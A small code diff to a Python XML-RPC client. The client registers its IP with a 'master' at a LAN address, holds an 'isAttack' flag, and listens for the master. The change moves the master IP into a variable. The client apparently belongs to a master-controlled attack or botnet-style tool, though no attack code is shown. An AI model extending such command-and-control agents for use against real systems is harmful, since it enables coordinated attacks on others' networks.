@@ -7,7 +7,8 @@ import xmlrpc.client
 from xmlrpc.server import SimpleXMLRPCServer, SimpleXMLRPCRequestHandler
 from socketserver import ThreadingMixIn
 
-s = xmlrpc.client.ServerProxy("http://192.168.1.127:8000")
+master_ip = "192.168.1.127"
+s = xmlrpc.client.ServerProxy("http://"+master_ip+":8000")
 isAttack = False
 
 
@@ -75,7 +76,7 @@ if __name__ == '__main__':
     ip_address = getIpAddress()
     s.register_ip(ip_address)
     try:
-        listenMaster("192.168.1.127")
+        listenMaster(master_ip)
     except KeyboardInterrupt:
         s.unregister_ip(ip_address)
         sys.exit(0)
